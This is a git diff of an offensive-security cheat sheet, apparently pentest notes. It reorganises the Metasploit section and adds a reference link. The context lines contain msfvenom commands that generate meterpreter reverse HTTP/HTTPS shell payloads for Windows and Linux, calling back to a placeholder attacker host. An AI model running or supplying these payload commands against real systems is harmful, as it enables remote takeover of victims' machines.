@@ -70,6 +70,10 @@ Enjoy creating your own 🦠
 - [Windows_Download_Execute](#Windows_Download_Execute)
 - [Windows_With_Creds](#Windows_With_Creds)
 
+<br>
+
+# [MetaSploit](#Metasploit-1)
+-[Metasploit_Refs](#Metasploit_Refs)
 
 <br>
 
@@ -86,8 +90,6 @@ Enjoy creating your own 🦠
 # [PowerUpSQL](#PowerUpSQL-1)
 
 # [Rubeus](#Rubeus-1)
-
-# [Metasploit](#Metasploit-1)
 
 # [Tools](#Tools-1)
 
@@ -1311,10 +1313,14 @@ Undo-Impersonation
 [Cheatsheet 2](https://github.com/GhostPack/Rubeus)
 
 [Cheatsheet 3](https://www.puckiestyle.nl/kerberos-cheatsheet/)
+
+<br>
 <br>
 
 # Metasploit
 
+
+### Msfvenom:
 ```
 sudo msfvenom -p windows/x64/meterpreter/reverse_http lhost=192.168.x.x lport=8080 EXITFUNC=thread -f csharp
 ```
@@ -1342,9 +1348,12 @@ msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.x.x lport=4444 -
 ```
 msfvenom -p linux/x86/meterpreter/reverse_https lhost=192.168.x.x lport=4444 -f elf -o lin-4444
 ```
+
+### Metasploit_Ref
+
+- [Metasploit](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet.md)
+
 <br>
-
-
 
 # Tools
 
